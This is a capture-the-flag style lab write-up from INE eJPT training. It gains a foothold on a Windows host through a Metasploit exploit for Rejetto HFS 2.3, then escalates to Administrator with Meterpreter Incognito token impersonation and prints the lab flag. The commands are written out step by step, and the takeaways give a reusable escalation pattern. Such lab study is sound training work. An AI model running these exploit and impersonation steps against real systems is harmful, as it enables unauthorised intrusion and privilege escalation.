# Windows Token Impersonation - INE eJPT

INE privilege escalation lab demonstrating access token impersonation on Windows. Initial access via Rejetto HFS RCE lands a Meterpreter session as `Local Service` - insufficient to read the Administrator desktop. The Incognito module enumerates available tokens and impersonates an Administrator token without kernel exploitation.

Target: `demo.ine.local`

---

## Reconnaissance

```bash
ping -c 4 demo.ine.local
nmap demo.ine.local
nmap -sV -p 80 demo.ine.local
```

Port 80 - Rejetto HTTP File Server (HFS) 2.3.

---

## Initial Access - HFS RCE

```bash
searchsploit hfs
```

RCE available for HFS 2.3.

```bash
msfconsole -q
use exploit/windows/http/rejetto_hfs_exec
set RHOSTS demo.ine.local
exploit
getuid
```

Session context: `Local Service` - limited privileges.

---

## Exploitation Attempt (Fails)

```bash
cat C:\\Users\\Administrator\\Desktop\\flag.txt
```

Access denied. The `Local Service` account cannot read the Administrator profile.

---

## Privilege Escalation - Token Impersonation

### Load Incognito

```bash
load incognito
```

### Enumerate Available Tokens

```bash
list_tokens -u
```

Token available:

```
ATTACKDEFENSE\Administrator
```

### Impersonate

```bash
impersonate_token "ATTACKDEFENSE\\Administrator"
getuid
```

Context updated to `ATTACKDEFENSE\Administrator`.

## Flags

```bash
cat C:\\Users\\Administrator\\Desktop\\flag.txt
```

```
x28c832a39730b7d46d6c38f1ea18e12
```

---

## Key Takeaways

- Windows access tokens are separate from user accounts. A process running as `Local Service` can hold impersonation tokens for higher-privilege users if those users have previously authenticated on the system.
- Token impersonation is silent: no new process is created, no credential is presented, and no UAC prompt appears. It is harder to detect than lateral movement techniques.
- `list_tokens -u` shows all tokens available in the current process context. The presence of `Administrator` or `SYSTEM` tokens makes `getsystem` and Incognito approaches equivalent in outcome.
- Incognito is a Meterpreter extension, not a standalone exploit. It does not create tokens - it impersonates existing ones. Tokens must already be present on the system from prior authentication activity.
- The pattern applies to any Windows session: initial access -> `getuid` to confirm privilege level -> `list_tokens -u` to check available tokens -> impersonate if higher-privilege token is present.

---

## Disclaimer

This lab was completed in a controlled environment provided by INE as part of the eJPT preparation path. All actions were performed strictly for educational purposes.
